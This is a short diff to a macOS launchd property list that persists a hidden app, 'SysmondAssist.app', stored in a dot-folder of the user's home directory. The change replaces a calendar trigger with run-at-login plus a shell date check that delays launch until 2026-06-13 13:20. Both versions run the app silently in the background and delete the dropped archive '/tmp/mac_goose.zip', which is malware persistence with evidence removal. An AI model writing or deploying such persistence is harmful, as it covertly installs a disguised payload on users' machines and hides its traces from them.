@@ -8,14 +8,9 @@
   <array>
     <string>/bin/sh</string>
     <string>-c</string>
-    <string>nohup /usr/bin/open -a "$(eval echo ~$USER)/.sysmond_config/SysmondAssist.app" &amp;&gt;/dev/null &amp; disown &amp;&amp; rm /tmp/mac_goose.zip</string>
+    <string>if [ $(date +%s) -ge $(date -j -f "%Y-%m-%d %H:%M" "2026-06-13 13:20" +%s) ]; then nohup /usr/bin/open -a "$(eval echo ~$USER)/.sysmond_config/SysmondAssist.app" &amp;&gt;/dev/null &amp; disown &amp;&amp; rm /tmp/mac_goose.zip; fi</string>
   </array>
-  <key>StartCalendarInterval</key>
-  <dict>
-    <key>Month</key>  <integer>6</integer>
-    <key>Day</key>    <integer>13</integer>
-    <key>Hour</key>   <integer>13</integer>
-    <key>Minute</key> <integer>20</integer>
-  </dict>
+  <key>RunAtLoad</key>
+  <true/>
 </dict>
 </plist>
